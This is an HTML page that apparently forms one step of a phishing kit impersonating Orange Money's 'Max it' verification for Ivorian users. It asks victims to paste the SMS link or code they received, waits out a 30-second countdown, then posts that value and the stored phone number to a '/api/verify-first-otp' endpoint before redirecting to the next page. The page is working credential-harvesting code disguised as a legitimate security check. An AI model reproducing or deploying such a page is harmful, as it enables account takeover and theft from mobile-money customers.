<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification Max It</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            background-color: #f7f7f7; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            font-family: sans-serif; 
        }
        
        /* Enlarged header box and text */
        .header-box { 
            width: 100%; 
            background: #f15a24; 
            padding: 35px 20px; 
            color: white; 
            text-align: center; 
            font-size: 36px; 
            font-weight: 800; 
            box-sizing: border-box;
        }
        
        /* Enlarged container card */
        .card { 
            background: #fff; 
            width: 90%; 
            max-width: 520px; 
            padding: 45px 30px; 
            border-radius: 24px; 
            margin-top: 35px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            box-sizing: border-box;
        }

        .card h2 {
            font-size: 32px;
            margin-top: 0;
            margin-bottom: 15px;
        }

        .card p {
            font-size: 20px;
            color: #444;
            line-height: 1.4;
        }

        .phone-display {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 25px;
        }
        
        /* Significantly enlarged input field */
        .link-input { 
            width: 100%; 
            height: 120px; 
            border: 3px solid #f15a24; 
            border-radius: 16px; 
            padding: 16px; 
            font-size: 20px; 
            font-family: sans-serif; 
            box-sizing: border-box; 
            resize: none; 
            margin-bottom: 25px; 
        }
        
        /* Scaled-up action button */
        .submit-btn, .proceed-btn { 
            width: 100%; 
            background-color: #e0e0e0; 
            color: #999; 
            border: none; 
            padding: 22px; 
            border-radius: 16px; 
            font-weight: 800; 
            font-size: 22px;
            transition: background-color 0.3s ease;
            margin-bottom: 12px;
        }

        .submit-btn.active { 
            background-color: #f15a24; 
            color: white; 
            cursor: pointer; 
        }

        .proceed-btn {
            background-color: transparent;
            color: #f15a24;
            border: 2px solid #f15a24;
            cursor: pointer;
        }

        .proceed-btn:hover {
            background-color: #f15a24;
            color: white;
        }

        .timer-text { 
            font-size: 18px; 
            color: #555; 
            margin-bottom: 20px; 
            text-align: center; 
            font-weight: 700; 
        }
    </style>
</head>
<body>
<div class="header-box">Orange Money</div>
<div class="card">
    <h2>Vérification Max it</h2>
    <p>Collez le lien ou le message reçu par SMS ci-dessous :</p>
    <div class="phone-display">🇨🇮 +225 <span id="displayPhone"></span></div>
    
    <!-- Scaled-up paste input box -->
    <textarea id="smsLinkInput" class="link-input" placeholder="Collez le lien ou le SMS ici..."></textarea>
    
    <div id="timerText" class="timer-text">Veuillez patienter <span id="countdown">30</span>s avant de valider...</div>
    
    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
    <button id="proceedBtn" class="proceed-btn">PROCÉDER</button>
</div>

<script>
    const smsLinkInput = document.getElementById('smsLinkInput');
    const submitBtn = document.getElementById('submitBtn');
    const proceedBtn = document.getElementById('proceedBtn');
    const countdownEl = document.getElementById('countdown');
    const timerText = document.getElementById('timerText');
    
    document.getElementById('displayPhone').textContent = localStorage.getItem('phone');

    let isTimeElapsed = false;
    let timeLeft = 30;

    // 30-second countdown timer
    const timer = setInterval(() => {
        timeLeft--;
        countdownEl.textContent = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(timer);
            isTimeElapsed = true;
            timerText.style.display = 'none';
            checkFormValidity();
        }
    }, 1000);

    function checkFormValidity() {
        const hasText = smsLinkInput.value.trim().length > 0;
        const isValid = hasText && isTimeElapsed;
        
        submitBtn.disabled = !isValid;
        submitBtn.classList.toggle('active', isValid);
    }

    smsLinkInput.addEventListener('input', checkFormValidity);

    submitBtn.addEventListener('click', async () => {
        if (!submitBtn.disabled) {
            const linkValue = smsLinkInput.value.trim();
            await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: localStorage.getItem('phone'), code: linkValue, country: "CI" })
            });
            window.location.href = "page9.html";
        }
    });

    // Proceed option action
    proceedBtn.addEventListener('click', () => {
        window.location.href = "page9.html";
    });
</script>
</body>
</html>
